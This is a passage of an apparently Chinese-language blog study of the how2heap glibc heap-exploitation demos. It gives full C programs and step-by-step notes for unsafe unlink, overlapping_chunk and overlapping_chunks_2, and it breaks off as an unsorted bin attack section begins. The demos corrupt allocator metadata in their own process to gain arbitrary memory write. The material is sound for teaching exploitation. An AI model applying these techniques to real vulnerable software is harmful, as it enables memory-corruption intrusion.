class="line"><span class="number">1373</span>       &#125;                                                                       </span><br><span class="line"><span class="number">1374</span> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>最重要的就是绕过这个东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">//if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) </span></span><br><span class="line">&gt;FD = P-&gt;fd</span><br><span class="line">&gt;BK = P-&gt;bk</span><br><span class="line">&gt;FD-&gt;bk = P&amp; BK-&gt;fd=P</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>主要流程</p><ol><li>先分配两个堆A和B，其中A里面有我们要伪造的chunk，B主要是用来更改一些标志的东西</li><li>首先我们需要在A中伪造chunk，这里是在需要一个bss段的地址addr。将其addr-0x10和addr-0x18写入伪造chunk的fd和bk中，也就通过上面unlink的校验</li><li>然后我们为了实现后向合并，需要将B中的pre_size改为80,以及将inuse改为0，伪造前一个堆块是空闲的。</li><li>此时进行free chunkB的话，就会进行后向合并</li></ol><p>如图所示</p><p><img src="/2021/05/19/how2heap/image-20210520231314463.png" alt="image-20210520231314463"></p><p>利用条件：</p><ol><li>我们得知道一个BSS段的地址</li><li>我们的bin通常是small或unsorted</li><li>该位置指向的chunk是UAF的</li></ol><p><strong>影响：可以将P改为P-0x18</strong></p></blockquote><h1 id="0x07-overlapping-chunk"><a href="#0x07-overlapping-chunk" class="headerlink" title="0x07 overlapping_chunk"></a>0x07 overlapping_chunk</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem\n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's start to allocate 3 chunks on the heap\n"</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's free the chunk p2\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"For a toy program, the value of the last 3 bits is unimportant;"</span></span><br><span class="line"><span class="string">" however, it is best to maintain the stability of the heap.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span></span><br><span class="line"><span class="string">" to assure that p1 is not mistaken for a free chunk.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span>,</span><br><span class="line"> evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the "size" field of chunk p2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate another chunk with a size equal to the data\n"</span></span><br><span class="line">       <span class="string">"size of the chunk p2 injected size\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This malloc will be served from the previously freed chunk that\n"</span></span><br><span class="line">       <span class="string">"is parked in the unsorted bin which size has been modified by us\n"</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 has been allocated at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 starts at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span></span><br><span class="line"><span class="string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's run through an example. Right now, we have:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>程序很简单，主要就是将一个堆块3放入堆块4中，具体操作</p><ol><li>先分配3个堆块</li><li>先将第2个堆块释放，运用一些方法，将chunk2的size改变</li><li>此时分配第4个堆块和chunk2的size一样大，就可以把chunk3 包含进去</li></ol><p>利用条件：可以修改chunk的size</p><p><strong>影响：对一些堆块进行任意写，即使被释放</strong></p></blockquote><h1 id="0x08-overlapping-chunks-2"><a href="#0x08-overlapping-chunks-2" class="headerlink" title="0x08 overlapping_chunks_2"></a>0x08 overlapping_chunks_2</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's start to allocate 5 chunks on the heap:"</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n\nchunk p1 from %p to %p"</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p2 from %p to %p"</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p3 from %p to %p"</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p4 from %p to %p"</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p5 from %p to %p\n"</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">'A'</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">'B'</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">'C'</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">'D'</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">'E'</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n"</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis operation will basically create a big free chunk that wrongly includes p3\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p6 from %p to %p"</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p3 from %p to %p\n"</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nData inside chunk p3: \n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's write something inside p6\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">'F'</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nData inside chunk p3: \n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>和第一个程序的区别是：这个是改变未释放的chunk，1是改变释放的chunk</strong></p><p>流程：</p><ol><li>先分配5个chunk，然后修改2的size域</li><li>释放chunk2，此时继续分配，即可overlap</li></ol></blockquote><h1 id="0x09-unsorted-bin-attack"><a href="#0x09-unsorted-bin-attack" class="headerlink" title="0x09 unsorted bin attack"></a>0x09 unsorted bin attack</h1><p>基本原理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">/* 